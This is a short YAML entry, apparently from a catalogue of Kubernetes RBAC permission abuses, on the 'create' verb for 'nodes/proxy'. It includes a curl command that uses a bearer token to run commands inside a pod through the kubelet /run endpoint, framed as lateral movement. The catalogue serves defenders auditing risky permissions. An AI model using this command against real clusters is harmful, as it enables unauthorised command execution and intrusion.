---
verb: "create"
resource: "nodes/proxy"
description: "Allows to make CREATE requests to the kubelet API as system:masters"
abuses:
  - type: "Lateral Movement"
    description: "Execute commands in a pod"
    code: |
      curl -k -H "Authorization: Bearer TOKEN" -XPOST https://{IP}:10250/run/NAMESPACE/POD/CONTAINER -d "cmd=whoami"
    references:
      - "https://www.aquasec.com/blog/privilege-escalation-kubernetes-rbac/"
---